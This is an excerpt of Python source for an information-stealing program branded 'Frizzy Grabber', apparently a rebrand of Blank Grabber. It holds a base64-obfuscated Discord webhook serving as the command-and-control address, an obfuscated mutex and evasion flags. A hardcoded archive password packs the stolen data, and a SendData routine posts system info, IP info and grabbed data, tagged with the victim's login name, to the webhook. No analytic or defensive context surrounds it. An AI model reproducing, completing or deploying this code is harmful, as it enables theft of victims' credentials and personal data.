...
class Settings:
    C2 = (0, base64.b64decode('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE0NTc3ODA5MzA3Njc3NDk3Mi9TSDlJU055THlnbDl3M254dTFzSG9ySHRUd1BISXpfS2VPUGJ0Z0RCY3pTdG1RbXFMM2o1aVo0LWlLUkRZN3Q0VlEyYQ==').decode())
    Mutex = base64.b64decode('dVZnajU1WldGOEVxdW1QRg==').decode()
    PingMe = bool('true')
    Vmprotect = bool('true')
    Startup = bool('')
    Melt = bool('')
...
class BlankGrabber:
    ...
    def CreateArchive(self) -> tuple[str, str]:
        ...
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            ...
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or 'Fripom123'
    ...
    def SendData(self) -> None:
        ...
        filename = 'Frizzy-%s.%s' % (os.getlogin(), extention)
        ...
        match Settings.C2[0]:
            case 0:
                image_url = 'https://cdn.discordapp.com/attachments/1122857167150665781/1145153776450289665/IMG_1953.webp'
                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Frizzy Grabber', 'description': f'**__System Info__\n```autohotkey\n{system_info}```\n__IP Info__```prolog\n{ipinfo}```\n__Grabbed Info__```js\n{grabbedInfo}```**', 'url': 'https://github.com/Blank-c/Blank-Grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Frizzy Grabber | https://github.com/frizzyoncraack'}, 'thumbnail': {'url': image_url}}], 'username': 'Frizzy Grabber', 'avatar_url': image_url}
